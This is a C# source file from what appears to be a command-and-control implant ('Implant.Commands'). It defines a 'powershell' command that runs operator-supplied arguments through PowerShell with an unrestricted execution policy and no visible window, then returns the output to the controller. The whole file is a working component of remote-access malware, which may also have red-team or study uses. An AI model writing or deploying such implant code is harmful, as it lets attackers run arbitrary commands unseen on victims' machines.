using Implant.Models;
using System.Diagnostics;

namespace Implant.Commands
{
    public class ShellCommand : Command
    {
        public override string Name => "powershell";

        public override AgentTaskResult Execute(string taskId, string agentId, string arguments)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy unrestricted -Command \"{arguments}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                // Чтение результата выполнения команды
                string result = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return new AgentTaskResult
                {
                    AgentId = agentId,
                    Result = result,
                    TaskId = taskId
                };
            }
            
        }
    }
}
